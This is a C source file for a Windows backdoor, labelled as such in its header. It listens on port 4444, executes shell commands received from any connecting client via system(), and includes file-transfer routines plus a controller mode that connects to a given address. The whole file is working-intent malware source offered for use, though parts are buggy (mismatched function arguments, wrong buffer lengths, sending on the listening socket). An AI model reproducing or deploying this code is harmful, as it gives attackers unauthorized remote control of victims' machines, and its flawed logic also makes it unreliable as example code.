/*
 ****************************************************************
 * A simple backdoor for Windoze...                             *
 ****************************************************************
 */

#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>
#include <errno.h>
#include <unistd.h>

#include <windows.h>
#include <winsock2.h>

#define MY_PORT 4444
#define PROGRAM_NAME "C:\\Windows\\system32\\cmd.exe"

#define TERMINATE(A, T, M) ({\
	if((T)) {\
		if(A == 0) fprintf(stderr, "[LINE:%d] [FILE:%s] : ERROR: %s\n", __LINE__, __FILE__, M);\
		else if(A == 1) fprintf(stderr, "[LINE:%d] [FILE:%s] : WARNING: %s\n", __LINE__, __FILE__, M);\
		else fprintf(stdout, "%s\n", M);\
		errno = 0;\
		goto error;\
	}\
})

enum _TERMINATE {
	TERMINATE_ERROR,
	TERMINATE_WARNING,
	TERMINATE_NORMAL
};

void pzero(p, s)
	char *p;
	size_t s;
{
	size_t i;
	for(i=0; i<s+1; ++i)
		*(p+i)=0;
}

#define BUFSIZE 1
#define MAXBUF 1024

/* getln() - this is a function to grab input.
 */
char *getln()
{
	int size = BUFSIZE;
	int p = 0;
	char c;
	char *buf = NULL;

	buf = realloc(buf, size);
	if(!buf) return NULL;

	while(1) {
		c=getchar();
		if(c==-1 || c==0x0d) {
			++p;
			if(p>=size) {
				size+=BUFSIZE;
				buf=realloc(buf, size);
				if(!buf) return NULL;
				*(buf+p)=0;
				return(buf);
			}
		} else {
			*(buf+p)=c;
		}
		++p;

		if(p>=size) {
			size+=BUFSIZ;
			buf=realloc(buf, size);
			if(!buf) break;
		}
	}

	return NULL;
}

/* upload_server() - this is what the client runs.
 */
void upload_server(filename, address)
	const char *filename;
	const char *address;
{
	int sockfd, clientfd;
	struct sockaddr_in server;
	char *name = strrchr(filename, '\\');
	FILE *fp=fopen(name, "rb");
	if(fp==NULL)
		return;

	pzero(&server, sizeof(server));
	server.sin_family = AF_INET;
	server.sin_port = htons(666);
	server.sin_addr.s_addr = inet_addr(address);

	TERMINATE(TERMINATE_ERROR, (sockfd=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0, strerror(errno));
	TERMINATE(TERMINATE_ERROR, bind(sockfd, (struct sockaddr*)&server, sizeof(server)) < 0, strerror(errno));
	TERMINATE(TERMINATE_ERROR, listen(sockfd, 2) < 0, strerror(errno));

	TERMINATE(TERMINATE_ERROR, (clientfd=accept(sockfd, (struct sockaddr*)NULL, NULL)) < 0, strerror(errno));

	while(1) {
		char buf[MAXBUF];
		int nread;
		pzero(buf, sizeof(buf));

		nread = fread(buf, 1, MAXBUF, fp);
		if(nread>0) printf("Bytes read: %d\n", nread);

		/* If read was successful, send data. */
		if(nread > 0) {
			puts("Sending");
			if(send(sockfd, buf, MAXBUF, 0) < 0)
				puts("Error: sending data.");
		} else {
			if(feof(fp)==-1) puts("End of file...");
			if(ferror(fp)!=0) puts("Error reading file...");
			closesocket(clientfd);
			break;
		}
	}

error:
	fclose(fp);
	closesocket(sockfd);
}

char *nameget(filename)
	const char *filename;
{
	char string[128], *tmp = NULL;
	strcpy(string, filename);

	tmp = strtok(string, "\\");
	while((tmp=strtok(NULL, "\\")) != NULL);
	return tmp;
}

char *search_name(filename)
	char *filename;
{
	char *tmp = NULL;

	while(*filename != 0) {
		if(*filename == '\\')
			tmp = filename;
		else
			tmp = NULL;
		++filename;
	}
	if(tmp==NULL) return filename;
	return tmp;
}

/* upload_client() - this is what the server runs.
 */
void upload_client(filename, address)
	const char *filename;
	const char *address;
{
	int sockfd, bytes;
	struct sockaddr_in server;
	char buf[MAXBUF];

	FILE *fp=fopen(search_name(filename), "wb");
	if(fp==NULL)
		return;

	/* Zero buf and server structure, fill
	 * in the server structure */
	pzero(buf, sizeof(buf));
	pzero(&server, sizeof(server));
	server.sin_family = AF_INET;
	server.sin_port = htons(666);
	server.sin_addr.s_addr = inet_addr(address);

	/* Create a socket and connect to file transfer server */
	TERMINATE(TERMINATE_ERROR, (sockfd=socket(AF_INET, SOCK_STREAM, 0)) < 0, strerror(errno));
	TERMINATE(TERMINATE_ERROR, connect(sockfd, (struct sockaddr*)&server, sizeof(server)) < 0, strerror(errno));

	bytes=0;
	while((bytes=recv(sockfd, buf, MAXBUF, 0))>0) {
		printf("Bytes received : %d\n", bytes);
		if((bytes=fwrite(buf, 1, bytes, fp)) > 0)
			printf("Bytes written : %d\n", bytes);
		pzero(buf, sizeof(buf));
	}

error:
	fclose(fp);
	closesocket(sockfd);
}

int main(argc, argv)
	int argc;
	char **argv;
{
	WSADATA wsaData;
	int sockfd;
	struct sockaddr_in self;

	sockfd = 0;
	WSAStartup(MAKEWORD(2, 0), &wsaData);

	if(argc < 2) {
	    TERMINATE(TERMINATE_ERROR, (sockfd=socket(AF_INET, SOCK_STREAM, 0)) < 0, strerror(errno));

		/* Setup socket address struct */
		pzero(&self, sizeof(self));
		self.sin_family = AF_INET;
		self.sin_port = htons(MY_PORT);
		self.sin_addr.s_addr = INADDR_ANY;

		/* bind port to socket */
		TERMINATE(TERMINATE_ERROR, bind(sockfd, (struct sockaddr*)&self, sizeof(self)) < 0, strerror(errno));
		/* listen for connections */
		TERMINATE(TERMINATE_ERROR, listen(sockfd, 20) < 0, strerror(errno));

		for(;;) {
			int clientfd;
			struct sockaddr_in client;
			int clientlen = sizeof(client);
			char message[256];
			char buf[MAXBUF];

			/* accept connection */
			clientfd=accept(sockfd, (struct sockaddr*)&client, &clientlen);
			if(clientfd>0) {
				void upload_client();
				int bytes = 1;
				pzero(message, sizeof(message));
				sprintf(message, "%s:%u client connected.", inet_ntoa(client.sin_addr),
					client.sin_port);
				puts(message);
				while(bytes>0) {
					char command[64];
					pzero(buf, sizeof(buf));
					if(send(clientfd, "CMD >> ", 7, 0) != 7)
						puts("Error: sending data.");
					bytes=recv(clientfd, buf, MAXBUF, 0);

					if(bytes>0) {
						pzero(command, sizeof(command));
						sscanf(buf, "%s", command);

						/* commands */
						if(strncmp(command, "upload", 6) == 0) {
								char filename[128];

								/* Zero filename buffer, copy data to it */
								pzero(filename, sizeof(filename));
								if(send(clientfd, message, strlen(message), 0) != strlen(message))
									puts("Error sending message.");
								if(recv(clientfd, filename, strlen(filename), 0) != strlen(filename))
									puts("Error receiving filename.");

								/* upload file */
								upload_client(filename);
						} else if(strcmp(command, "cmd") == 0) {
							char tmp[128];
							pzero(tmp, sizeof(tmp));
							bytes=recv(clientfd, tmp, sizeof(tmp), 0);
							if(bytes>0) {
								system(tmp);
							} else if(bytes==0) {
								if(send(clientfd, "Unknown command.", 16, 0) != 16)
									puts("Error: sending data.");
							} else {
								puts("Unknown command.");
							}
						}
					} else if(bytes==0)
						puts("Nothing received.");
					else
						puts("Error: couldn't receive data.");
				}

				if(closesocket(clientfd)==0) {
					pzero(message, sizeof(message));
					sprintf(message, "%s:%u client disconnected.", inet_ntoa(client.sin_addr),
						client.sin_port);
					puts(message);
				}
			}
		}
		closesocket(sockfd);
	} else if(argc == 2) {
		char buf[MAXBUF];
		TERMINATE(TERMINATE_ERROR, (sockfd=socket(AF_INET, SOCK_STREAM, 0)) < 0, strerror(errno));
		pzero(&self, sizeof(self));
		self.sin_family = AF_INET;
		self.sin_port = htons(MY_PORT);
		self.sin_addr.s_addr = inet_addr(argv[1]);

        TERMINATE(0, connect(sockfd, (struct sockaddr*)&self, sizeof(self)) < 0, strerror(errno));

        while(1) {
        	void upload_server();
        	char reply[MAXBUF];
        	pzero(buf, sizeof(buf)/sizeof(char));
        	pzero(reply, sizeof(reply)/sizeof(char));

        	fflush(stdin);
        	if((recv(sockfd, reply, MAXBUF, 0)) < 0)
        		puts("Could not recv data.");
        	scanf("%[^\n]s", buf);
        	if(strcmp(buf, "exit")==0) break;
        	else if(strcmp(buf, "upload")==0) {
        		char *buf=NULL;
				char filename[128];
				char address[64];
				int bytes;

				pzero(filename, sizeof(filename));
				strcpy(address, argv[1]);

				printf("Enter filename: ");
				buf=getln();
				strcpy(filename, buf);
				free(buf);

				bytes=send(sockfd, filename, strlen(filename), 0);
				if(bytes<0)
					puts("Error: couldn't send data.");

				/* Upload file to server */
				upload_server(filename, address);
			}
			if((send(sockfd, buf, strlen(buf), 0)) != strlen(buf))
				puts("Could not send data.");
        }
        closesocket(sockfd);
	} else {
		fprintf(stderr, "Usage: Backdoor.exe [Address]\n");
	}

	WSACleanup();
	return 0;

error:
	if(sockfd != 0) closesocket(sockfd);
	WSACleanup();
	return 1;
}
